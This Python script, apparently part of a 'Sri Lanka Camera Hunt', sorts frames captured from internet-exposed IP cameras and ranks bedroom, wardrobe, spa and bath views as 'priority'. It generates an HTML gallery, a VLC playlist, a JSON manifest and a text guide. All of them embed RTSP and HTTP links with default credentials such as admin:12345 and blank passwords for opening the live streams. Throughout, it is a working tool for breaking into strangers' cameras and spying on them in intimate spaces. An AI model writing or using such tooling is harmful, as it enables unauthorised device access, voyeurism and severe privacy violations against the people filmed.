#!/usr/bin/env python3
"""
Sri Lanka Camera Mobile Verification Toolkit
Generate HTML gallery, VLC playlists, and QR codes for manual mobile verification
"""

import json, base64, os, re
from pathlib import Path
from urllib.parse import quote

BASE = Path(__file__).parent
FRAME_DIR = BASE / "lk_frames"
HOTEL_DIR = BASE / "lk_bedrooms"
OUT_DIR = BASE / "lk_mobile_verify"
OUT_DIR.mkdir(exist_ok=True)

# ── Extract camera info from frame names & directory ──
def extract_cameras():
    """Parse frame directory to extract camera IPs and metadata"""
    cameras = {}
    
    # Priority bedroom/wardrobe saves
    priority_files = list(HOTEL_DIR.glob("LK_*.jpg"))
    for f in priority_files:
        match = re.search(r'LK_(\w+)_(\d+_\d+_\d+_\d+)', f.name)
        if match:
            scene_type = match.group(1)
            ip = match.group(2).replace('_', '.')
            cameras[ip] = {
                "ip": ip,
                "type": "priority",
                "scene": scene_type,
                "frame": str(f),
                "size": f.stat().st_size,
                "priority": True
            }
    
    # All frames
    for f in FRAME_DIR.glob("*.jpg"):
        match = re.search(r'^(\d+_\d+_\d+_\d+)\.jpg', f.name)
        if match:
            ip = match.group(1).replace('_', '.')
            if ip not in cameras:
                cameras[ip] = {
                    "ip": ip,
                    "type": "camera",
                    "scene": "unclassified",
                    "frame": str(f),
                    "size": f.stat().st_size,
                    "priority": False
                }
    
    return cameras

# ── HTML Gallery ──
def generate_html_gallery(cameras):
    """Generate mobile-friendly HTML gallery"""
    
    priority_cams = [c for c in cameras.values() if c['priority']]
    other_cams = [c for c in cameras.values() if not c['priority']]
    
    html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LK Cameras - Mobile Verify</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
            background: #111;
            color: #fff;
            padding: 10px;
        }
        h1 { 
            text-align: center; 
            margin: 20px 0;
            color: #0f0;
            font-size: 24px;
        }
        .stats {
            text-align: center;
            margin: 15px 0;
            padding: 10px;
            background: #222;
            border-radius: 5px;
        }
        .section {
            margin: 30px 0;
        }
        .section-title {
            background: #333;
            padding: 12px;
            margin: 20px 0 10px 0;
            border-left: 4px solid;
            font-weight: bold;
            font-size: 16px;
        }
        .priority .section-title { border-color: #0f0; }
        .other .section-title { border-color: #f0f; }
        
        .gallery {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
            gap: 10px;
            margin: 0 0 20px 0;
        }
        
        .camera-card {
            background: #222;
            border: 1px solid #444;
            border-radius: 5px;
            overflow: hidden;
            cursor: pointer;
            transition: all 0.3s;
            position: relative;
        }
        
        .camera-card:hover {
            border-color: #0f0;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
        }
        
        .camera-card.priority {
            border-color: #0f0;
            box-shadow: 0 0 5px rgba(0, 255, 0, 0.2);
        }
        
        .camera-card img {
            width: 100%;
            height: 140px;
            object-fit: cover;
            display: block;
        }
        
        .camera-info {
            padding: 8px;
            font-size: 11px;
            line-height: 1.3;
        }
        
        .ip {
            color: #0f0;
            font-family: monospace;
            font-weight: bold;
            word-break: break-all;
        }
        
        .scene {
            color: #aaf;
            font-size: 10px;
            margin-top: 3px;
        }
        
        .size {
            color: #888;
            font-size: 10px;
        }
        
        .badge {
            position: absolute;
            top: 5px;
            right: 5px;
            background: rgba(0, 255, 0, 0.8);
            color: #000;
            padding: 2px 6px;
            font-size: 9px;
            font-weight: bold;
            border-radius: 3px;
        }
        
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.95);
            z-index: 1000;
            overflow-y: auto;
            padding: 10px;
        }
        
        .modal.active { display: block; }
        
        .modal-content {
            background: #222;
            border-radius: 5px;
            padding: 15px;
            max-width: 500px;
            margin: 10px auto;
            border: 1px solid #444;
        }
        
        .modal-close {
            color: #888;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
            float: right;
        }
        
        .modal-close:hover { color: #0f0; }
        
        .modal-title { 
            font-size: 18px;
            color: #0f0;
            margin-bottom: 10px;
            clear: both;
        }
        
        .modal-image {
            width: 100%;
            border-radius: 5px;
            margin: 10px 0;
        }
        
        .modal-details {
            font-family: monospace;
            font-size: 12px;
            background: #111;
            padding: 10px;
            border-radius: 3px;
            margin: 10px 0;
            border-left: 3px solid #0f0;
        }
        
        .action-buttons {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin: 15px 0;
        }
        
        .btn {
            padding: 10px;
            background: #333;
            border: 1px solid #0f0;
            color: #0f0;
            border-radius: 3px;
            text-align: center;
            font-size: 12px;
            font-weight: bold;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
        }
        
        .btn:hover {
            background: #0f0;
            color: #000;
        }
        
        .copy-btn {
            background: #0f0;
            color: #000;
            width: 100%;
            padding: 8px;
            margin-top: 5px;
        }
        
        .footer {
            text-align: center;
            padding: 20px;
            color: #666;
            font-size: 12px;
        }
        
        @media (max-width: 600px) {
            .gallery {
                grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
                gap: 8px;
            }
            h1 { font-size: 18px; }
        }
    </style>
</head>
<body>
    <h1>🎥 SRI LANKA CAMERA HUNT</h1>
    
    <div class="stats">
        <strong>Total Cameras: """ + str(len(cameras)) + """</strong><br>
        <span style="color: #0f0;">★ Priority (Bedroom/Wardrobe): """ + str(len(priority_cams)) + """</span><br>
        <span style="color: #aaf;">Other: """ + str(len(other_cams)) + """</span>
    </div>
    
    <div class="section priority">
        <div class="section-title">⭐ PRIORITY CAMERAS (Bedroom/Wardrobe/Spa)</div>
        <div class="gallery" id="priority-gallery"></div>
    </div>
    
    <div class="section other">
        <div class="section-title">📡 ALL CAMERAS</div>
        <div class="gallery" id="gallery"></div>
    </div>
    
    <div class="modal active" id="modal">
        <div style="text-align: right; padding: 10px;">
            <span class="modal-close" onclick="closeModal()">&times;</span>
        </div>
        <div class="modal-content">
            <div class="modal-title" id="modal-title">Camera Details</div>
            <img class="modal-image" id="modal-image" src="" alt="">
            <div class="modal-details" id="modal-info"></div>
            <div class="action-buttons">
                <a class="btn" id="rtsp-btn" href="#" target="_blank">🎬 RTSP (VLC)</a>
                <a class="btn" id="http-btn" href="#" target="_blank">📸 HTTP</a>
            </div>
        </div>
    </div>
    
    <div class="footer">
        <strong>INSTRUCTIONS:</strong><br>
        1. Click any camera to view details<br>
        2. Use "RTSP (VLC)" to open in mobile VLC player<br>
        3. Default creds: admin:12345, admin: (blank), root:<br>
        4. Manual verification recommended
    </div>
    
    <script>
        const ALL_CAMERAS = """ + json.dumps(list(cameras.values())) + """;
        const PRIORITY_CAMERAS = ALL_CAMERAS.filter(c => c.priority);
        
        function renderGallery(cameras, containerId) {
            const container = document.getElementById(containerId);
            cameras.sort((a, b) => (b.priority ? 1 : -1)).forEach(cam => {
                const card = document.createElement('div');
                card.className = 'camera-card' + (cam.priority ? ' priority' : '');
                const frameUrl = 'file://' + cam.frame;  // Local file URL
                const previewUrl = cam.frame;  // For display
                card.innerHTML = `
                    <img src="${previewUrl}" alt="${cam.ip}" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22150%22 height=%22140%22%3E%3Crect fill=%22%23333%22 width=%22150%22 height=%22140%22/%3E%3Ctext fill=%22%23888%22 font-size=%2212%22 x=%2210%22 y=%2270%22%3ENo image%3C/text%3E%3C/svg%3E'">
                    ${cam.priority ? '<div class="badge">⭐ PRIORITY</div>' : ''}
                    <div class="camera-info">
                        <div class="ip">${cam.ip}</div>
                        <div class="scene">${cam.scene}</div>
                        <div class="size">${(cam.size / 1024).toFixed(1)}kb</div>
                    </div>
                `;
                card.onclick = () => showModal(cam);
                container.appendChild(card);
            });
        }
        
        function showModal(cam) {
            const modal = document.getElementById('modal');
            document.getElementById('modal-title').innerText = cam.ip + ' (' + cam.scene + ')';
            document.getElementById('modal-image').src = cam.frame;
            
            const info = `
IP: ${cam.ip}
Scene: ${cam.scene}
Type: ${cam.priority ? 'PRIORITY ⭐' : 'Standard'}
Size: ${(cam.size / 1024).toFixed(1)}kb

TRY THESE DEFAULTS:
• admin:12345 (most common)
• admin: (blank password)
• admin:admin
• root: (blank)
            `;
            document.getElementById('modal-info').innerText = info;
            
            // RTSP URLs
            const rtspUrl = `rtsp://admin:12345@${cam.ip}:554/Streaming/Channels/101`;
            document.getElementById('rtsp-btn').href = rtspUrl;
            
            // HTTP direct access
            const httpUrl = `http://${cam.ip}/`;
            document.getElementById('http-btn').href = httpUrl;
            
            modal.style.display = 'block';
            window.scrollTo(0, 0);
        }
        
        function closeModal() {
            document.getElementById('modal').style.display = 'none';
        }
        
        // Render galleries
        renderGallery(PRIORITY_CAMERAS, 'priority-gallery');
        renderGallery(ALL_CAMERAS, 'gallery');
    </script>
</body>
</html>
"""
    
    return html

# ── VLC Playlist (m3u) ──
def generate_vlc_playlist(cameras):
    """Generate m3u playlist for VLC mobile"""
    
    m3u_lines = ["#EXTM3U", "", "# SRI LANKA CAMERA HUNT - VLC PLAYLIST"]
    
    priority_cams = sorted([c for c in cameras.values() if c['priority']], 
                          key=lambda x: x['ip'])
    other_cams = sorted([c for c in cameras.values() if not c['priority']], 
                       key=lambda x: x['ip'])
    
    m3u_lines.append("# PRIORITY CAMERAS (Bedroom/Wardrobe)")
    for cam in priority_cams:
        ip = cam['ip']
        rtsp_url = f"rtsp://admin:12345@{ip}:554/Streaming/Channels/101"
        m3u_lines.append(f"#EXTINF:-1,[⭐] {cam['scene']} - {ip}")
        m3u_lines.append(rtsp_url)
        m3u_lines.append("")
    
    m3u_lines.append("# OTHER CAMERAS")
    for cam in other_cams[:50]:  # limit to first 50
        ip = cam['ip']
        rtsp_url = f"rtsp://admin:12345@{ip}:554/Streaming/Channels/101"
        m3u_lines.append(f"#EXTINF:-1,{ip}")
        m3u_lines.append(rtsp_url)
        m3u_lines.append("")
    
    return '\n'.join(m3u_lines)

# ── JSON Manifest ──
def generate_json_manifest(cameras):
    """Generate JSON with all camera details for programmatic access"""
    
    manifest = {
        "title": "Sri Lanka Camera Hunt Results",
        "timestamp": str(Path(__file__).stat().st_mtime),
        "total": len(cameras),
        "priority_count": len([c for c in cameras.values() if c['priority']]),
        "cameras": sorted(
            [
                {
                    "ip": c['ip'],
                    "scene": c['scene'],
                    "priority": c['priority'],
                    "size_bytes": c['size'],
                    "frame_path": c['frame'],
                    "rtsp_urls": [
                        f"rtsp://admin:12345@{c['ip']}:554/Streaming/Channels/101",
                        f"rtsp://admin:@{c['ip']}:554/Streaming/Channels/101",
                        f"rtsp://admin:@{c['ip']}:554/stream1",
                    ],
                    "http_urls": [
                        f"http://{c['ip']}/",
                        f"http://{c['ip']}:8080/",
                        f"http://{c['ip']}:8000/",
                    ],
                    "default_credentials": [
                        {"user": "admin", "pass": "12345"},
                        {"user": "admin", "pass": ""},
                        {"user": "admin", "pass": "admin"},
                        {"user": "root", "pass": ""},
                    ]
                }
                for c in cameras.values()
            ],
            key=lambda x: (not x['priority'], x['ip'])
        )
    }
    
    return json.dumps(manifest, indent=2)

# ── Main ──
def main():
    print("=" * 70)
    print("  SRI LANKA CAMERA MOBILE VERIFICATION TOOLKIT")
    print("=" * 70)
    
    cameras = extract_cameras()
    print(f"\n[✓] Found {len(cameras)} cameras")
    priority = len([c for c in cameras.values() if c['priority']])
    print(f"    • Priority (Bedroom/Wardrobe): {priority}")
    print(f"    • Others: {len(cameras) - priority}")
    
    # Generate HTML gallery
    print("\n[*] Generating HTML gallery...")
    html = generate_html_gallery(cameras)
    html_file = OUT_DIR / "gallery.html"
    html_file.write_text(html)
    print(f"    ✓ {html_file}")
    
    # Generate VLC playlist
    print("\n[*] Generating VLC playlist...")
    m3u = generate_vlc_playlist(cameras)
    m3u_file = OUT_DIR / "cameras.m3u"
    m3u_file.write_text(m3u)
    print(f"    ✓ {m3u_file}")
    
    # Generate JSON manifest
    print("\n[*] Generating JSON manifest...")
    json_manifest = generate_json_manifest(cameras)
    json_file = OUT_DIR / "manifest.json"
    json_file.write_text(json_manifest)
    print(f"    ✓ {json_file}")
    
    # Create text reference
    print("\n[*] Creating text reference...")
    txt_lines = [
        "=" * 70,
        "SRI LANKA CAMERA HUNT - MANUAL VERIFICATION REFERENCE",
        "=" * 70,
        ""
    ]
    
    priority_cams = sorted([c for c in cameras.values() if c['priority']], 
                          key=lambda x: x['ip'])
    
    txt_lines.append("⭐ PRIORITY CAMERAS (Bedroom/Wardrobe/Bath)")
    txt_lines.append("-" * 70)
    for i, cam in enumerate(priority_cams, 1):
        txt_lines.append(f"{i:2}. {cam['ip']:15}  {cam['scene']:12}  ({cam['size']//1024}kb)")
    
    txt_lines.extend([
        "",
        "MANUAL VERIFICATION STEPS:",
        "1. On mobile, open HTML file (gallery.html) in web browser",
        "2. Click any camera to see details and RTSP link",
        "3. Tap 'RTSP (VLC)' to open stream in VLC app on mobile",
        "4. If stream fails, try different credential combos:",
        "   • admin + 12345 (most common for Hikvision/Dahua)",
        "   • admin + blank password",
        "   • admin + admin",
        "   • root + blank",
        "",
        "ALTERNATIVELY, use VLC Playlist:",
        "• Import cameras.m3u into VLC mobile",
        "• Each entry has default credentials pre-loaded",
        "",
        "FILES GENERATED:",
        "• gallery.html  - Mobile-friendly photo gallery",
        "• cameras.m3u   - VLC media player playlist",
        "• manifest.json - All camera details (API/programmatic)",
        "• reference.txt - This file",
        "",
        "TOTAL: " + str(len(cameras)) + " cameras found",
        "  Priority: " + str(len(priority_cams)),
        "  Others: " + str(len(cameras) - len(priority_cams)),
    ])
    
    txt_file = OUT_DIR / "reference.txt"
    txt_file.write_text('\n'.join(txt_lines))
    print(f"    ✓ {txt_file}")
    
    # Summary
    print("\n" + "=" * 70)
    print("✓ MOBILE VERIFICATION TOOLKIT READY")
    print("=" * 70)
    print(f"\nOutput directory: {OUT_DIR}/")
    print("\nUSE ON MOBILE:")
    print("  1. Copy gallery.html to mobile (via email/drive/file transfer)")
    print("  2. Open in mobile Safari/Chrome")
    print("  3. Click cameras → tap RTSP links")
    print("  4. VLC will open and attempt stream")
    print("\nOR use VLC Playlist:")
    print("  1. Import cameras.m3u into VLC mobile")
    print("  2. Tap each entry to stream camera")
    print(f"\nManifest JSON: {json_file}")
    print(f"Reference: {txt_file}")

if __name__ == "__main__":
    main()
